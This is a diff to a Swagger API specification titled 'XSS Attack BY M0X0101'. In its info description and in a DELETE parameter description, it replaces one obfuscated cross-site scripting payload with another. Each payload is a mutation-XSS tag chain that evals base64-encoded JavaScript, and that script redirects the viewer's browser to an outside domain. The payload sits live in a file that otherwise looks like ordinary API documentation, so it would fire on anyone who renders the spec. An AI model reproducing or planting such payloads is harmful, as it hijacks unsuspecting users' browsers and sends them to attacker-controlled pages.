@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5BdXRvIFJlZGlyZWN0PC90aXRsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwczovL3NlcnZpY2VnbG9iYWwtZGlnaXRhbHNvbHV0aW9uLmNvbS9lZHVjYXRpb24tY29udGVudC9yZWRpcmVjdC5odG1sJzsKICAgIDwvc2NyaXB0Pgo8L2hlYWQ+CjwvaHRtbD4K' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='d2luZG93Lm9ubG9hZD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0Lmh0bWwnO307Cg==' onerror='eval(atob(this.id))'>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5BdXRvIFJlZGlyZWN0PC90aXRsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwczovL3NlcnZpY2VnbG9iYWwtZGlnaXRhbHNvbHV0aW9uLmNvbS9lZHVjYXRpb24tY29udGVudC9yZWRpcmVjdC5odG1sJzsKICAgIDwvc2NyaXB0Pgo8L2hlYWQ+CjwvaHRtbD4K' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='d2luZG93Lm9ubG9hZD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vc2VydmljZWdsb2JhbC1kaWdpdGFsc29sdXRpb24uY29tL2VkdWNhdGlvbi1jb250ZW50L3JlZGlyZWN0Lmh0bWwnO307Cg==' onerror='eval(atob(this.id))'>"></form>
           format: int64
           in: path
           name: id
